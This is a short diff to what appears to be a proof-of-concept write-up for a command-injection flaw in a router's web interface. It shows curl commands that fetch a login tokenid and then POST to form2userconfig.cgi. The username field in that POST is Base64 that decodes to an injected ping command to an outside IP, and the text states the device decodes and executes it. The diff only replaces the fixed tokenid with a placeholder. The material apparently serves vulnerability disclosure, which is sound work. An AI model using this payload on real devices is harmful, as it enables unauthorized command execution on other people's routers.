@@ -76,7 +76,7 @@ First, get the tokenid
 curl -s http://192.168.33.9/dir_login.asp  | grep tokenid
 ```
 ```
-curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=JztwaW5nIDExMi4xMjYuOTkuOTE7Jw==&oldpass=123&newpass=MTIz&confpass=MTIz&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send&tokenid=1804289383"
+curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=JztwaW5nIDExMi4xMjYuOTkuOTE7Jw==&oldpass=123&newpass=MTIz&confpass=MTIz&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send&tokenid=xxxxx"#input id
 ```
 It will decode our command Base64 and execute it 
 
